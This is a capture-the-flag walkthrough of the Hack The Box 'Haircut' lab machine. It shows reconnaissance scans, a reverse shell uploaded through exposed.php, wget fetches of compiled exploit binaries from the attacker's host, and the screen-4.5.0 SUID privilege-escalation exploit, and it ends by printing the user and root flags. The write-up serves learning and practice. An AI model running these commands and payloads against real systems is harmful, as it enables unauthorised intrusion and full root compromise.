<center><h1>Haircut</h1><center>
<br>
<center><h3>Summary</h3></center>
<br>

First start with an Nmap scan
```
# nmap -sV -sC -T4 -p- 10.10.10.24
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-26 16:37 UTC
Nmap scan report for 10.10.10.24
Host is up (0.060s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)
|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)
|_  256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)
80/tcp open  http    nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title:  HTB Hairdresser
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.49 seconds
```
Only a couple ports to work with. Checking out port 80 we are greeted with a basic web page with a photo.

<center><img src="/htb/haircut/home.png"></center>
<br>
Running a gobuster we find a couple of pages.
```
# gobuster dir -u http://10.10.10.24 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 20    
===============================================================                                                                               
Gobuster v3.0.1                                                                                                                               
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                                                                               
===============================================================                                                                               
[+] Url:            http://10.10.10.24                                                                                                        
[+] Threads:        20                                                                                                                        
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                                              
[+] Status codes:   200,204,301,302,307,401,403                                                                                               
[+] User Agent:     gobuster/3.0.1                                                                                                            
[+] Extensions:     txt,php                                                                                                                   
[+] Timeout:        10s                                                                                                                       
===============================================================                                                                               
2019/09/26 16:46:56 Starting gobuster                                                                                                         
===============================================================                                                                               
/uploads (Status: 301)                                                                                                                        
/exposed.php (Status: 200)                                                                                                              
```
The <b>/uploads</b> directory redirects us to a 403 so we cant do much there right now. The <b>/exposed.php</b> is the one that we want. In the top left we see a button that prints out a <b>test.html</b> file from the localhost.

<center><img src="/htb/haircut/button.png"></center>
<br>
I decided to try and see if I can interact with my attacking machine. To do this I set up a <b>python SimpleHTTPServer</b> on my attacking machine so I could attempt to transfer the a reverse shell over.
```
# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...

# http://10.10.14.21/shell.php -o uploads/shell.php
```
Now I set up my <b>nc</b> listener and then triggered the shell by navigating to <b>http://10.10.14.21/uploads/shell.php</b>. If we check the listener then we will see that a shell has opened
```
# nc -lvnp 9999                                                                                                  
listening on [any] 9999 ...                                                                                                                   
connect to [10.10.14.21] from (UNKNOWN) [10.10.10.24] 43682                                                                                   
Linux haircut 4.4.0-78-generic #99-Ubuntu SMP Thu Apr 27 15:29:09 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux                                     
 19:45:58 up  1:08,  0 users,  load average: 0.00, 0.00, 0.00                                                                                 
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT                                                                           
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                         
/bin/sh: 0: can't access tty; job control turned off                                                                                          
$
```
From here we can grab the user flag
```
$ cat user.txt
 0b0da2af50e9ab7c81a6ec2c562afeae
```
Now for the priv esc. If we run a LinEnum script you should see the vulnerable <b>SUID</b> binary <b>screen-4.5.0</b>.
```
-rwsr-sr-x 1 daemon daemon 51464 Jan 14  2016 /usr/bin/at                                                                                     
-rwsr-xr-x 1 root root 54256 May  4  2017 /usr/bin/passwd                                                                                     
-rwsr-xr-x 1 root root 1588648 May 19  2017 /usr/bin/screen-4.5.0                                                                             
-rwsr-xr-x 1 root root 40432 May  4  2017 /usr/bin/chsh                                                                                       
-rwsr-xr-x 1 root root 49584 May  4  2017 /usr/bin/chfn                                                                                       
```
A quick google search will reveal the exploit *[here](https://www.exploit-db.com/exploits/41154)*. The problem is the exploit does not work stright away because <b>gcc</b> is broken on the box so we need to compile <b>libhax.c</b> and <b>rootshell.c</b> locally and then upload them to the box.
```
# gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c                                                                        
/tmp/libhax.c: In function ‘dropshell’:

# gcc -o /tmp/rootshell /tmp/rootshell.c                                                                                        
/tmp/rootshell.c: In function ‘main’:
```
Now we need to copy <b>libhax.so</b> and <b>rootshell</b> over to the <b>/tmp</b> directory on the box. We can do this using a <b>python SimpleHTTPServer</b> again
```
$ wget 10.10.14.21:8000/rootshell                                                                                                             
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.                                                      
--2019-09-26 21:02:00--  http://10.10.14.21:8000/rootshell                                                                                    
Connecting to 10.10.14.21:8000... connected.                                                                                                  
HTTP request sent, awaiting response... 200 OK                                                                                                
Length: 16824 (16K) [application/octet-stream]                                                                                                
Saving to: 'rootshell'                                                                                                                        

     0K .......... ......                                     100%  562K=0.03s                                                                

2019-09-26 21:02:01 (562 KB/s) - 'rootshell' saved [16824/16824]                                                                              

[+] done!                                                                                                                                     
$ wget 10.10.14.21:8000/libhax.so                                                                                                             
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.                                                      
ERROR: ld.so: object '/tmp/libhax.so' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.                  
--2019-09-26 21:01:48--  http://10.10.14.21:8000/libhax.so                                                                                    
Connecting to 10.10.14.21:8000... connected.                                                                                                  
HTTP request sent, awaiting response... 200 OK                                                                                                
Length: 16136 (16K) [application/octet-stream]                                                                                                
Saving to: 'libhax.so'                                                                                                                        

     0K .......... .....                                      100%  521K=0.03s                                                                

2019-09-26 21:01:48 (521 KB/s) - 'libhax.so' saved [16136/16136]                                                                              
```
Now run the exploit from earlier
```
$ bash screenroot.sh
~ gnu/screenroot ~
[+] First, we create our shell and library...
gcc: error trying to exec 'cc1': execvp: No such file or directory
gcc: error trying to exec 'cc1': execvp: No such file or directory
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-www-data.

whoami
root
```
Now we can grab the root flag
```
# cat root.txt
4cfa26d84b2220826a07f0697dc72151
```
<br><br><br><br>
